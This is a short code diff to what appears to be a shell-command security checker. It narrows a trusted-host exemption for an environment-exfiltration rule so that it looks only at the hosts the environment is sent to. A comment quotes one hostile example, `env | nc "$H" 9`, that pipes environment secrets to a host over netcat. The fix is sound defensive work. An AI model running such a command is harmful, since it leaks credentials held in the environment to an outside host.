@@ -647,10 +647,12 @@ async function evaluatePolicyCore(
           action === 'off' ? undefined : outbound.findings.find((f) => f.checkId === id);
         if (!finding) continue;
         // The environment going to hosts the user trusts with secrets is the
-        // pipe-chain's trusted-host case: allowed.
+        // pipe-chain's trusted-host case: allowed. Judged on the hosts the
+        // environment is sent to, not every host in the command: a trusted
+        // `curl` beside `env | nc "$H" 9` must not exempt the nc.
         if (id === 'data.env-exfil' && isTrustedHost) {
-          const hosts = extractShellDestinations(bashCommand).map((d) => d.host);
-          if (hosts.length > 0 && hosts.every((h) => isTrustedHost(h))) continue;
+          const hosts = finding.destinations;
+          if (hosts && hosts.length > 0 && hosts.every((h) => isTrustedHost(h))) continue;
         }
         outboundVerdicts.push(
           applyCheckValue(action, {
